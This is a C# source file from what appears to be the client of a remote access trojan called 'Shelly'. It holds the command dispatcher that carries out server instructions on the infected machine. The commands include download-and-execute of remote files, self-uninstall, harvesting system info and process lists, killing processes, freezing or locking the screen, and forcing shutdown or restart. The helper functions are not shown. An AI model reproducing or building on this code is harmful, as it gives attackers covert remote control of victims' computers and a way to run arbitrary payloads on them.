﻿using System;

namespace Shelly_Client
{
    class InputOutput
    {
        public static void IO(string IO)
        {
            string[] Command = IO.Split(' ');

            // Read data
            switch (Command[0])
            {
                // Uninstall shell
                case "uninstall":

                    // Disconnect
                    SocketHandler.Disconnect();

                    // Uninstall
                    Functions.InstallMethods.Uninstall();

                    // Exit
                    Environment.Exit(0);
                    break;

                case "disconnect":

                    // Disconnect and exit
                    SocketHandler.ShutdownClient();
                    break;

                // Send ping to server
                case "ping":

                    // Send message
                    SocketHandler.Send(Functions.General.Ping());
                    break;

                // Display messagebox
                case "messagebox":

                    // Display messagebox
                    Functions.General.MsgBox(Command[1]);
                    break;

                // Download and execute
                case "downloadandexecute":

                    // Download file and drop to temp
                    Functions.General.DAE(Command[1], Command[2]);
                    
                    break;

                // Open website
                case "openwebsite":

                    // Open website
                    Functions.General.OpenWebsite(Command[1]);
                    break;

                // Get info
                case "info":

                    // Get system info and send back
                    SocketHandler.Send(Functions.General.GetSystemInfo());
                    break;

                // Terminate process
                case "taskkill":

                    // Check if user wants process list or not
                    if (Command.Length == 1)
                    {
                        // Send list of running processes
                        SocketHandler.Send(Functions.General.GetRunningProcesses());
                    } else
                    {
                        // Terminate process
                        Functions.General.TerminateProcess(Command[1]);
                    }
                    break;

                // Download and execute
                case "changewallpaper":

                    // Change wallpaper
                    Functions.Fun.CWP(Command[1]);
                    break;

                // Freeze
                case "freeze":

                    // Disconnect
                    SocketHandler.Disconnect();

                    // Freeze
                    Functions.Fun.Freeze();
                    break;

                // Lock
                case "lock":

                    // Lock
                    Functions.Fun.Lock(int.Parse(Command[1]));
                    break;

                // Shutdown computer
                case "shutdown":

                    // Shutdown
                    Functions.PowerOptions.Shutdown();

                    // Disconnect and exit
                    SocketHandler.ShutdownClient();
                    break;

                // Restart computer
                case "restart":
                    Functions.PowerOptions.Restart();

                    // Disconnect and exit
                    SocketHandler.ShutdownClient();
                    break;

                // Hibernate computer
                case "hibernate":
                    Functions.PowerOptions.Hibernate();

                    // Disconnect
                    SocketHandler.Disconnect();
                    break;
            }
        }
    }
}
